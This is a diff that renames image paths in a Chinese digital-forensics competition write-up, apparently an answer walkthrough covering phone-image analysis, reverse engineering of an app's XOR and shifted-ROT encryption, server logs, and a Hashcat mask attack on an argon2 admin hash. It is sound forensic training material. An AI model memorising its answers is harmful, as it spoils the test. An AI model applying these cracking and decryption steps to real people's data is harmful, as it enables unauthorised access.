@@ -21,12 +21,12 @@ Pixel 6
 在检材的镜像文件边上
 
 
-<img src="/Picture/WpDF/Pinghang/2026Group/1.png" width="662" title="" crop="0,0,1,1" id="u13e17362" class="ne-image">
+<img src="/Picture/WpDF/Pinghang/26Grp/1.png" width="662" title="" crop="0,0,1,1" id="u13e17362" class="ne-image">
 
 这是个json文件（进去看看格式就能猜出来），里面有一个键值对就是xinxi
 
 
-<img src="/Picture/WpDF/Pinghang/2026Group/2.png" width="887.5" title="" crop="0,0,1,1" id="u09eb2e11" class="ne-image">
+<img src="/Picture/WpDF/Pinghang/26Grp/2.png" width="887.5" title="" crop="0,0,1,1" id="u09eb2e11" class="ne-image">
 
 ### 2 分析早起王的手机，早起王最近想旅行，结合高德地图搜索记录，他最可能去的景点是哪个【答案格式：黄山】
 #### 答案
@@ -36,7 +36,7 @@ Pixel 6
 火眼直接看
 
 
-<img src="/Picture/WpDF/Pinghang/2026Group/3.png" width="1439.5" title="" crop="0,0,1,1" id="udf1d4fed" class="ne-image">
+<img src="/Picture/WpDF/Pinghang/26Grp/3.png" width="1439.5" title="" crop="0,0,1,1" id="udf1d4fed" class="ne-image">
 
 ### 3 分析早起王的手机，早起王在什么时间加上倩倩微信的?【答案格式：2025-08-18 07:09:19】
 #### 答案
@@ -48,7 +48,7 @@ Pixel 6
 看名字都能猜出来哪位是倩倩
 
 
-<img src="/Picture/WpDF/Pinghang/2026Group/4.png" width="1439.5" title="" crop="0,0,1,1" id="u1c0a512c" class="ne-image">
+<img src="/Picture/WpDF/Pinghang/26Grp/4.png" width="1439.5" title="" crop="0,0,1,1" id="u1c0a512c" class="ne-image">
 
 ### 4 分析早起王的手机，倩倩在2026年3月30号吃了什么?【答案格式：西湖醋鱼】
 #### 答案
@@ -62,7 +62,7 @@ Pixel 6
 还真是
 
 
-<img src="/Picture/WpDF/Pinghang/2026Group/5.png" width="1439.5" title="" crop="0,0,1,1" id="u719a360e" class="ne-image">
+<img src="/Picture/WpDF/Pinghang/26Grp/5.png" width="1439.5" title="" crop="0,0,1,1" id="u719a360e" class="ne-image">
 
 看的我好尬（）
 ### 5 # 分析倩倩的手机，倩倩手机的系统版本是多少?【答案格式：5.2.3.123】
@@ -77,7 +77,7 @@ Pixel 6
 里面有一个键值对就是版本
 
 
-<img src="/Picture/WpDF/Pinghang/2026Group/6.png" width="1439.5" title="" crop="0,0,1,1" id="u7acd0b6c" class="ne-image">
+<img src="/Picture/WpDF/Pinghang/26Grp/6.png" width="1439.5" title="" crop="0,0,1,1" id="u7acd0b6c" class="ne-image">
 
 ### 6 分析倩倩的手机，“舔狗”的微信内部ID是多少?【答案格式： wxid_ab12】
 #### 答案
@@ -87,7 +87,7 @@ wxid_uh5tfx2zi8yh22
 火眼通讯录
 
 
-<img src="/Picture/WpDF/Pinghang/2026Group/7.png" width="1439.5" title="" crop="0,0,1,1" id="ue709db2b" class="ne-image">
+<img src="/Picture/WpDF/Pinghang/26Grp/7.png" width="1439.5" title="" crop="0,0,1,1" id="ue709db2b" class="ne-image">
 
 ### 7 分析倩倩的手机，倩倩曾给一位好友推荐游戏，这个好友叫什么名字?【答案格式：杨梅】
 #### 答案
@@ -103,7 +103,7 @@ wxid_uh5tfx2zi8yh22
 短信也没有，小红书也没有，只有便签了
 
 
-<img src="/Picture/WpDF/Pinghang/2026Group/8.png" width="1439.5" title="" crop="0,0,1,1" id="u9f3a75e1" class="ne-image">
+<img src="/Picture/WpDF/Pinghang/26Grp/8.png" width="1439.5" title="" crop="0,0,1,1" id="u9f3a75e1" class="ne-image">
 
 ### 8 分析倩倩的手机结合逆向包，推荐的游戏叫什么?【答案格式： far echo】
 #### 答案
@@ -115,7 +115,7 @@ zero sievert
 一开始能找到文件，但是完全打不开
 
 
-<img src="/Picture/WpDF/Pinghang/2026Group/9.png" width="954" title="" crop="0,0,1,1" id="u96cd7cb9" class="ne-image">
+<img src="/Picture/WpDF/Pinghang/26Grp/9.png" width="954" title="" crop="0,0,1,1" id="u96cd7cb9" class="ne-image">
 
 说句实话要不是文件不多，我第一次真没注意到这俩是图片
 完全打不开的
@@ -143,7 +143,7 @@ zero sievert
 里面有35条，但是前两条似乎并不是文章
 
 
-<img src="/Picture/WpDF/Pinghang/2026Group/10.png" width="1439.5" title="" crop="0,0,1,1" id="u19e81ea0" class="ne-image">
+<img src="/Picture/WpDF/Pinghang/26Grp/10.png" width="1439.5" title="" crop="0,0,1,1" id="u19e81ea0" class="ne-image">
 
 ### 10 分析倩倩手机逆向包，数据加密app的包名是什么?【答案格式： com.komeiji.satori】
 #### 答案
@@ -153,18 +153,18 @@ com.koishi.fpt
 整个逆向就一个包，你说呢（）
 
 
-<img src="/Picture/WpDF/Pinghang/2026Group/11.png" width="674.5" title="" crop="0,0,1,1" id="uc3581cc8" class="ne-image">
+<img src="/Picture/WpDF/Pinghang/26Grp/11.png" width="674.5" title="" crop="0,0,1,1" id="uc3581cc8" class="ne-image">
 
 事实上去app里面看也是一样的。由于.app格式事实上就是一个文件夹，或者说zip文件，直接用解压软件就能解开了
 
 
-<img src="/Picture/WpDF/Pinghang/2026Group/12.png" width="1213.5" title="" crop="0,0,1,1" id="u462d96fe" class="ne-image">
+<img src="/Picture/WpDF/Pinghang/26Grp/12.png" width="1213.5" title="" crop="0,0,1,1" id="u462d96fe" class="ne-image">
 
 呐~标志性头文件
 然后打开看里面的info也是这个包名
 
 
-<img src="/Picture/WpDF/Pinghang/2026Group/13.png" width="1439.5" title="" crop="0,0,1,1" id="ue79919d9" class="ne-image">
+<img src="/Picture/WpDF/Pinghang/26Grp/13.png" width="1439.5" title="" crop="0,0,1,1" id="ue79919d9" class="ne-image">
 
 ### 11 接上题，初始化app时需要至少几位数的密码?【答案格式：10】
 #### 答案
@@ -176,7 +176,7 @@ com.koishi.fpt
 这个文件位置（应该是）固定的，在.hap文件里面（直接解压就行），ets文件夹中
 
 
-<img src="/Picture/WpDF/Pinghang/2026Group/14.png" width="1439.5" title="" crop="0,0,1,1" id="u53cb7c9a" class="ne-image">
+<img src="/Picture/WpDF/Pinghang/26Grp/14.png" width="1439.5" title="" crop="0,0,1,1" id="u53cb7c9a" class="ne-image">
 
 有一说一，反编译的这个函数名为什么前面会有一堆#（？）
 
@@ -192,7 +192,7 @@ com.koishi.fpt
 猜测解密过程应该也在这里，并且确认了加密后缀应该就是.tb
 
 
-<img src="/Picture/WpDF/Pinghang/2026Group/15.png" width="1439.5" title="" crop="0,0,1,1" id="u234cf9d7" class="ne-image">
+<img src="/Picture/WpDF/Pinghang/26Grp/15.png" width="1439.5" title="" crop="0,0,1,1" id="u234cf9d7" class="ne-image">
 
 ### 13 接上题， app会自动识别几种后缀的文件为图片类型?【答案格式：8】
 #### 答案
@@ -202,7 +202,7 @@ com.koishi.fpt
 这个真是接上题
 
 
-<img src="/Picture/WpDF/Pinghang/2026Group/16.png" width="1439.5" title="" crop="0,0,1,1" id="u4097162c" class="ne-image">
+<img src="/Picture/WpDF/Pinghang/26Grp/16.png" width="1439.5" title="" crop="0,0,1,1" id="u4097162c" class="ne-image">
 
 ### 14 接上题， app共从用于自定义加密的so模块导入了几个方法?【答案格式：8】
 #### 答案
@@ -215,14 +215,14 @@ com.koishi.fpt
 
 https://bbs.kanxue.com/thread-283225-1.htm当然也能看这个，记得转换成zip
 
-<img src="/Picture/WpDF/Pinghang/2026Group/17.png" width="1439.5" title="" crop="0,0,1,1" id="u6c7d9a61" class="ne-image">
+<img src="/Picture/WpDF/Pinghang/26Grp/17.png" width="1439.5" title="" crop="0,0,1,1" id="u6c7d9a61" class="ne-image">
 
 那就简单了，直接暴力搜索import就行
 
 一共就2个
 
 
-<img src="/Picture/WpDF/Pinghang/2026Group/18.png" width="1002.5" title="" crop="0,0,1,1" id="u4f31a9bb" class="ne-image">
+<img src="/Picture/WpDF/Pinghang/26Grp/18.png" width="1002.5" title="" crop="0,0,1,1" id="u4f31a9bb" class="ne-image">
 
 ### 15 接上题， app设置的密码是多少?【答案格式：514aalla4191a98】
 #### 答案
@@ -234,9 +234,9 @@ https://bbs.kanxue.com/thread-283225-1.htm当然也能看这个，记得转换�
 那对于这俩文件，很明显上面是用户数据存储的地方（毕竟第8题图片就存在那里），下面是应用本身
 
 
-<img src="/Picture/WpDF/Pinghang/2026Group/19.png" width="403" title="" crop="0,0,1,1" id="u6f0b9345" class="ne-image">
+<img src="/Picture/WpDF/Pinghang/26Grp/19.png" width="403" title="" crop="0,0,1,1" id="u6f0b9345" class="ne-image">
 
-<img src="/Picture/WpDF/Pinghang/2026Group/20.png" width="866" title="" crop="0,0,1,1" id="u1b5166c1" class="ne-image">
+<img src="/Picture/WpDF/Pinghang/26Grp/20.png" width="866" title="" crop="0,0,1,1" id="u1b5166c1" class="ne-image">
 
 去文件夹里找（反正也不大）
 
@@ -261,7 +261,7 @@ A:\1-手机\倩倩手机逆向包\fpt-default-signed - 副本\entry-default\libs
 这里搜索crypto（so文件名称），目的是定位到具体函数，因为要看加密逻辑是什么
 
 
-<img src="/Picture/WpDF/Pinghang/2026Group/21.png" width="1439.5" title="" crop="0,0,1,1" id="u83e42ae2" class="ne-image">
+<img src="/Picture/WpDF/Pinghang/26Grp/21.png" width="1439.5" title="" crop="0,0,1,1" id="u83e42ae2" class="ne-image">
 
 双击进入函数查看逻辑
 
@@ -276,11 +276,11 @@ LDP             Q0, Q1, [X9,#(off_D930 - 0xD8F0)] ; "xorEncrypt"
 同理，去D900找rot13
 
 
-<img src="/Picture/WpDF/Pinghang/2026Group/22.png" width="882" title="" crop="0,0,1,1" id="ue50d3278" class="ne-image">
+<img src="/Picture/WpDF/Pinghang/26Grp/22.png" width="882" title="" crop="0,0,1,1" id="ue50d3278" class="ne-image">
 
-<img src="/Picture/WpDF/Pinghang/2026Group/23.png" width="1439.5" title="" crop="0,0,1,1" id="uaf564998" class="ne-image">
+<img src="/Picture/WpDF/Pinghang/26Grp/23.png" width="1439.5" title="" crop="0,0,1,1" id="uaf564998" class="ne-image">
 
-<img src="/Picture/WpDF/Pinghang/2026Group/24.png" width="1439.5" title="" crop="0,0,1,1" id="u577515fd" class="ne-image">
+<img src="/Picture/WpDF/Pinghang/26Grp/24.png" width="1439.5" title="" crop="0,0,1,1" id="u577515fd" class="ne-image">
 
 然后这里（理论上）能从前端（？）（就是modules.abc）看出来密码是通过rot13加密的
 
@@ -289,11 +289,11 @@ LDP             Q0, Q1, [X9,#(off_D930 - 0xD8F0)] ; "xorEncrypt"
 忽略掉一长串的定义后看逻辑部分代码
 
 
-<img src="/Picture/WpDF/Pinghang/2026Group/25.png" width="1439.5" title="" crop="0,0,1,1" id="ub7c80d3a" class="ne-image">
+<img src="/Picture/WpDF/Pinghang/26Grp/25.png" width="1439.5" title="" crop="0,0,1,1" id="ub7c80d3a" class="ne-image">
 
-<img src="/Picture/WpDF/Pinghang/2026Group/26.png" width="1439.5" title="" crop="0,0,1,1" id="uf89057fb" class="ne-image">
+<img src="/Picture/WpDF/Pinghang/26Grp/26.png" width="1439.5" title="" crop="0,0,1,1" id="uf89057fb" class="ne-image">
 
-<img src="/Picture/WpDF/Pinghang/2026Group/27.png" width="1439.5" title="" crop="0,0,1,1" id="u49a073e2" class="ne-image">
+<img src="/Picture/WpDF/Pinghang/26Grp/27.png" width="1439.5" title="" crop="0,0,1,1" id="u49a073e2" class="ne-image">
 
 从这里能（？）推断出加密方式逻辑是rot13，但是偏移量其实是16而非13
 
@@ -306,14 +306,14 @@ LDP             Q0, Q1, [X9,#(off_D930 - 0xD8F0)] ; "xorEncrypt"
 所以这实际上是偏移了16的rot13（鉴定为纯粹的诈骗）
 
 
-<img src="/Picture/WpDF/Pinghang/2026Group/28.png" width="505" title="" crop="0,0,1,1" id="ued1f5067" class="ne-image">
+<img src="/Picture/WpDF/Pinghang/26Grp/28.png" width="505" title="" crop="0,0,1,1" id="ued1f5067" class="ne-image">
 
 那既然如此，用rot16把前面那串密码解出来即可
 
 对了，记得解密是-16
 
 
-<img src="/Picture/WpDF/Pinghang/2026Group/29.png" width="1439.5" title="" crop="0,0,1,1" id="u97478bad" class="ne-image">
+<img src="/Picture/WpDF/Pinghang/26Grp/29.png" width="1439.5" title="" crop="0,0,1,1" id="u97478bad" class="ne-image">
 
 ### 16 接上题， app中存储的门锁密码是多少?【答案格式：5141141919810】
 #### 答案
@@ -325,16 +325,16 @@ LDP             Q0, Q1, [X9,#(off_D930 - 0xD8F0)] ; "xorEncrypt"
 在files文件夹下面的notes和vault文件夹下面都能看到加密文件
 
 
-<img src="/Picture/WpDF/Pinghang/2026Group/30.png" width="864" title="" crop="0,0,1,1" id="ud05e1d42" class="ne-image">
+<img src="/Picture/WpDF/Pinghang/26Grp/30.png" width="864" title="" crop="0,0,1,1" id="ud05e1d42" class="ne-image">
 
-<img src="/Picture/WpDF/Pinghang/2026Group/31.png" width="882" title="" crop="0,0,1,1" id="u85275748" class="ne-image">
+<img src="/Picture/WpDF/Pinghang/26Grp/31.png" width="882" title="" crop="0,0,1,1" id="u85275748" class="ne-image">
 
 而与此对应的，在Dashboard这个文件下面也能看到两种加密对象，一个是笔记一个是文件
 
 前一个跳转到noteslist的生命周期函数，后一个跳转到filelist
 
 
-<img src="/Picture/WpDF/Pinghang/2026Group/32.png" width="1439.5" title="" crop="0,0,1,1" id="u97142cd4" class="ne-image">
+<img src="/Picture/WpDF/Pinghang/26Grp/32.png" width="1439.5" title="" crop="0,0,1,1" id="u97142cd4" class="ne-image">
 
 下一题是问图片加密是什么，推测此题答案在notes里
 
@@ -343,7 +343,7 @@ LDP             Q0, Q1, [X9,#(off_D930 - 0xD8F0)] ; "xorEncrypt"
 查看noteslist的主函数（func_main_0）
 
 
-<img src="/Picture/WpDF/Pinghang/2026Group/33.png" width="1154.5" title="" crop="0,0,1,1" id="udc4da4c2" class="ne-image">
+<img src="/Picture/WpDF/Pinghang/26Grp/33.png" width="1154.5" title="" crop="0,0,1,1" id="udc4da4c2" class="ne-image">
 
 第一个obj在注册这个类中存在什么东西
 
@@ -356,7 +356,7 @@ LDP             Q0, Q1, [X9,#(off_D930 - 0xD8F0)] ; "xorEncrypt"
 在aboutToAppear里面，这就在检测密码是否存在，若存在直接调用loadNotes
 
 
-<img src="/Picture/WpDF/Pinghang/2026Group/34.png" width="1171" title="" crop="0,0.1272,1,1" id="ue0c559cf" class="ne-image">
+<img src="/Picture/WpDF/Pinghang/26Grp/34.png" width="1171" title="" crop="0,0.1272,1,1" id="ue0c559cf" class="ne-image">
 
 ds的翻译
 async aboutToAppear() {
@@ -377,11 +377,11 @@ async aboutToAppear() {
 然后去看loadNotes
 
 
-<img src="/Picture/WpDF/Pinghang/2026Group/35.png" width="1221" title="" crop="0,0,1,1" id="ua1514e41" class="ne-image">
+<img src="/Picture/WpDF/Pinghang/26Grp/35.png" width="1221" title="" crop="0,0,1,1" id="ua1514e41" class="ne-image">
 
-<img src="/Picture/WpDF/Pinghang/2026Group/36.png" width="1222" title="" crop="0,0,1,1" id="ufc4b4982" class="ne-image">
+<img src="/Picture/WpDF/Pinghang/26Grp/36.png" width="1222" title="" crop="0,0,1,1" id="ufc4b4982" class="ne-image">
 
-<img src="/Picture/WpDF/Pinghang/2026Group/37.png" width="1221.5" title="" crop="0,0,1,1" id="u9fdd7dd6" class="ne-image">
+<img src="/Picture/WpDF/Pinghang/26Grp/37.png" width="1221.5" title="" crop="0,0,1,1" id="u9fdd7dd6" class="ne-image">
 
 ds的翻译
 async loadNotes() {
@@ -435,9 +435,9 @@ async loadNotes() {
 此时去a/d里查看
 
 
-<img src="/Picture/WpDF/Pinghang/2026Group/38.png" width="1182" title="" crop="0,0,1,1" id="u53538bce" class="ne-image">
+<img src="/Picture/WpDF/Pinghang/26Grp/38.png" width="1182" title="" crop="0,0,1,1" id="u53538bce" class="ne-image">
 
-<img src="/Picture/WpDF/Pinghang/2026Group/39.png" width="1255.5" title="" crop="0,0,1,1" id="u9e3fac90" class="ne-image">
+<img src="/Picture/WpDF/Pinghang/26Grp/39.png" width="1255.5" title="" crop="0,0,1,1" id="u9e3fac90" class="ne-image">
 
 不难发现，b2实际上就是s1（啥也没干就引用了s1），而且这时候也能发现a2也调用了s1，推测a2就是加密（因为格式完全一致，b2是解密那a2很可能是加密），因此这里用的是对称加密（流密码）来加密笔记的（加解密用同一个函数）
 
@@ -448,9 +448,9 @@ async loadNotes() {
 在ida里反编译出来的这个sub_5D58，意义是将俩函数存到napi表里面，而且只存了这俩函数（具体汇编看不大懂，问AI即可（））
 
 
-<img src="/Picture/WpDF/Pinghang/2026Group/40.png" width="1164" title="" crop="0,0,1,1" id="ud4bbf26d" class="ne-image">
+<img src="/Picture/WpDF/Pinghang/26Grp/40.png" width="1164" title="" crop="0,0,1,1" id="ud4bbf26d" class="ne-image">
 
-<img src="/Picture/WpDF/Pinghang/2026Group/41.png" width="1049.5" title="" crop="0,0,1,1" id="u474d12ba" class="ne-image">
+<img src="/Picture/WpDF/Pinghang/26Grp/41.png" width="1049.5" title="" crop="0,0,1,1" id="u474d12ba" class="ne-image">
 
 ds老师的解释
 
@@ -491,7 +491,7 @@ BL     .__stack_chk_fail   ; 检查失败就会跳过来带有栈保护的函数
 然后，这俩函数，rot13在前一题展示过，该函数只传一个参数，不符合s1读取俩参数的行为
 
 
-<img src="/Picture/WpDF/Pinghang/2026Group/42.png" width="842.5" title="" crop="0,0,1,1" id="u48d6a52a" class="ne-image">
+<img src="/Picture/WpDF/Pinghang/26Grp/42.png" width="842.5" title="" crop="0,0,1,1" id="u48d6a52a" class="ne-image">
 
 这里基本可以完全断定xor就是s1（虽然这中间具体逻辑依旧找不到，就是说为什么这里是从注册表里读的是s1而那里注册的是xorEncrypt，这俩名字找不到对应）
 
@@ -510,14 +510,14 @@ Trae的翻译：
 output[i] = (key[i % key_len] + (i % key_len)) XOR input[i]
 
 
-<img src="/Picture/WpDF/Pinghang/2026Group/43.png" width="829.5" title="" crop="0,0,1,1" id="uc325cfa0" class="ne-image">
+<img src="/Picture/WpDF/Pinghang/26Grp/43.png" width="829.5" title="" crop="0,0,1,1" id="uc325cfa0" class="ne-image">
 
-<img src="/Picture/WpDF/Pinghang/2026Group/44.png" width="990.5" title="" crop="0,0,1,1" id="ubdeb2c85" class="ne-image">
+<img src="/Picture/WpDF/Pinghang/26Grp/44.png" width="990.5" title="" crop="0,0,1,1" id="ubdeb2c85" class="ne-image">
 
 这里的key在modules.abc里面很明显，就是前一题的password_hash
 
 
-<img src="/Picture/WpDF/Pinghang/2026Group/45.png" width="1243" title="" crop="0,0,1,1" id="u53fc0720" class="ne-image">
+<img src="/Picture/WpDF/Pinghang/26Grp/45.png" width="1243" title="" crop="0,0,1,1" id="u53fc0720" class="ne-image">
 
 鉴于xor出的密文再xor一次就能复原，直接把这段加密代码复制过去就能用了
 
@@ -601,14 +601,14 @@ print(f"文件成功保存在:{newPath}");
 就这样把俩文件都解出来
 
 
-<img src="/Picture/WpDF/Pinghang/2026Group/46.jpg" width="454" title="" crop="0,0,1,1" id="ud147327d" class="ne-image">
+<img src="/Picture/WpDF/Pinghang/26Grp/46.jpg" width="454" title="" crop="0,0,1,1" id="ud147327d" class="ne-image">
 
-<img src="/Picture/WpDF/Pinghang/2026Group/47.png" width="3200" title="" crop="0,0,1,1" id="u8b69017f" class="ne-image">
+<img src="/Picture/WpDF/Pinghang/26Grp/47.png" width="3200" title="" crop="0,0,1,1" id="u8b69017f" class="ne-image">
 
 666flag藏第二张图片16进制尾
 
 
-<img src="/Picture/WpDF/Pinghang/2026Group/48.png" width="1439.5" title="" crop="0,0,1,1" id="u12d2f056" class="ne-image">
+<img src="/Picture/WpDF/Pinghang/26Grp/48.png" width="1439.5" title="" crop="0,0,1,1" id="u12d2f056" class="ne-image">
 
 到这里，第8题也一并做出来了（那你放第8题干啥？？）
 
@@ -621,7 +621,7 @@ print(f"文件成功保存在:{newPath}");
 直接在火眼看
 
 
-<img src="/Picture/WpDF/Pinghang/2026Group/49.png" width="1295.5" title="" crop="0,0,1,1" id="u2287cf5a" class="ne-image">
+<img src="/Picture/WpDF/Pinghang/26Grp/49.png" width="1295.5" title="" crop="0,0,1,1" id="u2287cf5a" class="ne-image">
 
 ### 19 分析服务器镜像，用户登录成功系统的次数为?【答案格式：3】
 #### 答案
@@ -635,7 +635,7 @@ print(f"文件成功保存在:{newPath}");
 last -f ~/wtmp
 
 
-<img src="/Picture/WpDF/Pinghang/2026Group/50.png" width="766" title="" crop="0,0,1,1" id="u195950f4" class="ne-image">
+<img src="/Picture/WpDF/Pinghang/26Grp/50.png" width="766" title="" crop="0,0,1,1" id="u195950f4" class="ne-image">
 
 
 
@@ -644,7 +644,7 @@ last -f ~/wtmp
 （我再也不相信火眼了）
 
 
-<img src="/Picture/WpDF/Pinghang/2026Group/51.png" width="1377.5" title="" crop="0,0,1,1" id="ua6b05e77" class="ne-image">
+<img src="/Picture/WpDF/Pinghang/26Grp/51.png" width="1377.5" title="" crop="0,0,1,1" id="ua6b05e77" class="ne-image">
 
 ### 20 分析服务器镜像，redis数据库服务密码是多少?【答案格式：abedef】
 #### 答案
@@ -662,9 +662,9 @@ ubuntu-vg(yQKxyl-n4VL-YA9k-c2Po-rOKS-7MHk-yCHSAk)/分区0/etc/redis
 导出后在文件中搜索requirepass，后面跟的就是密码
 
 
-<img src="/Picture/WpDF/Pinghang/2026Group/52.png" width="1439.5" title="" crop="0,0,1,1" id="u8e11aa57" class="ne-image">
+<img src="/Picture/WpDF/Pinghang/26Grp/52.png" width="1439.5" title="" crop="0,0,1,1" id="u8e11aa57" class="ne-image">
 
-<img src="/Picture/WpDF/Pinghang/2026Group/53.png" width="989" title="" crop="0,0,1,1" id="u2be3598e" class="ne-image">
+<img src="/Picture/WpDF/Pinghang/26Grp/53.png" width="989" title="" crop="0,0,1,1" id="u2be3598e" class="ne-image">
 
 ### 21 分析服务器镜像，api站点后台管理员密码所用的加密算法为?【答案格式：berypt】
 #### 答案
@@ -678,7 +678,7 @@ ubuntu-vg(yQKxyl-n4VL-YA9k-c2Po-rOKS-7MHk-yCHSAk)/分区0/etc/redis
 编辑 -> 虚拟网络编辑器 -> 更改设置
 
 
-<img src="/Picture/WpDF/Pinghang/2026Group/54.png" width="620" title="" crop="0,0,1,1" id="ubc8de3ea" class="ne-image">
+<img src="/Picture/WpDF/Pinghang/26Grp/54.png" width="620" title="" crop="0,0,1,1" id="ubc8de3ea" class="ne-image">
 
 切换到VMnet8，给一个子网网络地址
 
@@ -687,23 +687,23 @@ ubuntu-vg(yQKxyl-n4VL-YA9k-c2Po-rOKS-7MHk-yCHSAk)/分区0/etc/redis
 到NAT设置里面把网关的网络位改成子网范围内的
 
 
-<img src="/Picture/WpDF/Pinghang/2026Group/55.png" width="603.5" title="" crop="0,0,1,1" id="u2498616f" class="ne-image">
+<img src="/Picture/WpDF/Pinghang/26Grp/55.png" width="603.5" title="" crop="0,0,1,1" id="u2498616f" class="ne-image">
 
-<img src="/Picture/WpDF/Pinghang/2026Group/56.png" width="597" title="" crop="0,0,1,1" id="u5f02bff8" class="ne-image">
+<img src="/Picture/WpDF/Pinghang/26Grp/56.png" width="597" title="" crop="0,0,1,1" id="u5f02bff8" class="ne-image">
 
-<img src="/Picture/WpDF/Pinghang/2026Group/57.png" width="626.5" title="" crop="0,0,1,1" id="u61b14e2e" class="ne-image">
+<img src="/Picture/WpDF/Pinghang/26Grp/57.png" width="626.5" title="" crop="0,0,1,1" id="u61b14e2e" class="ne-image">
 
 此刻新建虚拟机，在高级设置里面把网络改正NAT模式
 
 
-<img src="/Picture/WpDF/Pinghang/2026Group/58.png" width="1319" title="" crop="0,0,1,1" id="U6p1a" class="ne-image">
+<img src="/Picture/WpDF/Pinghang/26Grp/58.png" width="1319" title="" crop="0,0,1,1" id="U6p1a" class="ne-image">
 
 登录的用户名就是zaoqiwang，密码重置为123456了
 
 
-<img src="/Picture/WpDF/Pinghang/2026Group/59.png" width="741" title="" crop="0,0,1,1" id="XMknc" class="ne-image">
+<img src="/Picture/WpDF/Pinghang/26Grp/59.png" width="741" title="" crop="0,0,1,1" id="XMknc" class="ne-image">
 
-<img src="/Picture/WpDF/Pinghang/2026Group/60.png" width="1155.5" title="" crop="0,0,1,1" id="V7AhR" class="ne-image">
+<img src="/Picture/WpDF/Pinghang/26Grp/60.png" width="1155.5" title="" crop="0,0,1,1" id="V7AhR" class="ne-image">
 
 然后查看ip地址
 
@@ -712,12 +712,12 @@ ip addr
 ```
 
 
-<img src="/Picture/WpDF/Pinghang/2026Group/61.png" width="842.5" title="" crop="0,0,1,1" id="uabbdbac5" class="ne-image">
+<img src="/Picture/WpDF/Pinghang/26Grp/61.png" width="842.5" title="" crop="0,0,1,1" id="uabbdbac5" class="ne-image">
 
 这里能看到ip是169.254.54.4，可以用命令行ping一下看看能不能连上，能联上就能用finalshell
 
 
-<img src="/Picture/WpDF/Pinghang/2026Group/62.png" width="596" title="" crop="0,0,1,1" id="u4e1d454a" class="ne-image">
+<img src="/Picture/WpDF/Pinghang/26Grp/62.png" width="596" title="" crop="0,0,1,1" id="u4e1d454a" class="ne-image">
 
 ping不上先ping一下百度看看是不是主机问题
 ping www.baidu.com
@@ -726,7 +726,7 @@ ping www.baidu.com
 打开finalshell，用ssh连接
 
 
-<img src="/Picture/WpDF/Pinghang/2026Group/63.png" width="1293.5" title="" crop="0,0,1,1" id="ub01d6f33" class="ne-image">
+<img src="/Picture/WpDF/Pinghang/26Grp/63.png" width="1293.5" title="" crop="0,0,1,1" id="ub01d6f33" class="ne-image">
 
 设置SSH连接
 
@@ -737,17 +737,17 @@ ping www.baidu.com
 确定
 
 
-<img src="/Picture/WpDF/Pinghang/2026Group/64.png" width="1091" title="" crop="0,0,1,1" id="u9bac1a3a" class="ne-image">
+<img src="/Picture/WpDF/Pinghang/26Grp/64.png" width="1091" title="" crop="0,0,1,1" id="u9bac1a3a" class="ne-image">
 
 接受并保存
 
 
-<img src="/Picture/WpDF/Pinghang/2026Group/65.png" width="1319" title="" crop="0,0,1,1" id="u75b855a9" class="ne-image">
+<img src="/Picture/WpDF/Pinghang/26Grp/65.png" width="1319" title="" crop="0,0,1,1" id="u75b855a9" class="ne-image">
 
 然后就能连上了，文件系统就在下方
 
 
-<img src="/Picture/WpDF/Pinghang/2026Group/66.png" width="1440" title="" crop="0,0,1,1" id="u6c1f4ff0" class="ne-image">
+<img src="/Picture/WpDF/Pinghang/26Grp/66.png" width="1440" title="" crop="0,0,1,1" id="u6c1f4ff0" class="ne-image">
 
 
 
@@ -756,14 +756,14 @@ ping www.baidu.com
 在该文件夹下的/data/init.json就是配置文件
 
 
-<img src="/Picture/WpDF/Pinghang/2026Group/67.png" width="1439.5" title="" crop="0,0,1,1" id="uc862edd6" class="ne-image">
+<img src="/Picture/WpDF/Pinghang/26Grp/67.png" width="1439.5" title="" crop="0,0,1,1" id="uc862edd6" class="ne-image">
 
-<img src="/Picture/WpDF/Pinghang/2026Group/68.png" width="1015" title="" crop="0,0,1,1" id="u926fa4a6" class="ne-image">
+<img src="/Picture/WpDF/Pinghang/26Grp/68.png" width="1015" title="" crop="0,0,1,1" id="u926fa4a6" class="ne-image">
 
 打开后看到，加密方式是argon2
 
 
-<img src="/Picture/WpDF/Pinghang/2026Group/69.png" width="807" title="" crop="0,0,1,1" id="uf68fb321" class="ne-image">
+<img src="/Picture/WpDF/Pinghang/26Grp/69.png" width="807" title="" crop="0,0,1,1" id="uf68fb321" class="ne-image">
 
 ### 22 分析服务器镜像， api站点后台管理员密码为(使用rockyou字典爆破，密码格式b1?????b,?为数字)?【答案格式： a123456a】
 #### 答案
@@ -796,7 +796,7 @@ Hashcat神力
 注意到在上上题标注出来的文件夹下面有这样一个文件夹
 
 
-<img src="/Picture/WpDF/Pinghang/2026Group/70.png" width="1140" title="" crop="0,0,1,1" id="u7788235a" class="ne-image">
+<img src="/Picture/WpDF/Pinghang/26Grp/70.png" width="1140" title="" crop="0,0,1,1" id="u7788235a" class="ne-image">
 
 合理推测这是个nodejs的项目
 
@@ -930,7 +930,7 @@ node src/app.js
 
 
 
-<img src="/Picture/WpDF/Pinghang/2026Group/71.png" width="866" title="" crop="0,0,1,1" id="ubece3776" class="ne-image">
+<img src="/Picture/WpDF/Pinghang/26Grp/71.png" width="866" title="" crop="0,0,1,1" id="ubece3776" class="ne-image">
 
 开了服务器后会告诉你，地址是http://<服务器IP>:3000
 
@@ -944,20 +944,20 @@ node src/app.js
 
 在routes/admin下面有这样一个文件
 
-<img src="/Picture/WpDF/Pinghang/2026Group/72.png" width="1289.5" title="" crop="0,0,1,1" id="ub6485b2a" class="ne-image">
+<img src="/Picture/WpDF/Pinghang/26Grp/72.png" width="1289.5" title="" crop="0,0,1,1" id="ub6485b2a" class="ne-image">
 
 然后在/admin-next/dashboard地址下面，第一次输入即会切换到/admin-next/login下面
 
-<img src="/Picture/WpDF/Pinghang/2026Group/73.png" width="793" title="" crop="0,0,1,1" id="uddb8c150" class="ne-image">
+<img src="/Picture/WpDF/Pinghang/26Grp/73.png" width="793" title="" crop="0,0,1,1" id="uddb8c150" class="ne-image">
 
 登录名 zaoqiwang
 
 密码 b123321b
 
 
-<img src="/Picture/WpDF/Pinghang/2026Group/74.png" width="1393" title="" crop="0,0,1,1" id="u17afd4d9" class="ne-image">
+<img src="/Picture/WpDF/Pinghang/26Grp/74.png" width="1393" title="" crop="0,0,1,1" id="u17afd4d9" class="ne-image">
 
-<img src="/Picture/WpDF/Pinghang/2026Group/75.png" width="1353" title="" crop="0,0,1,1" id="ua297bb46" class="ne-image">
+<img src="/Picture/WpDF/Pinghang/26Grp/75.png" width="1353" title="" crop="0,0,1,1" id="ua297bb46" class="ne-image">
 
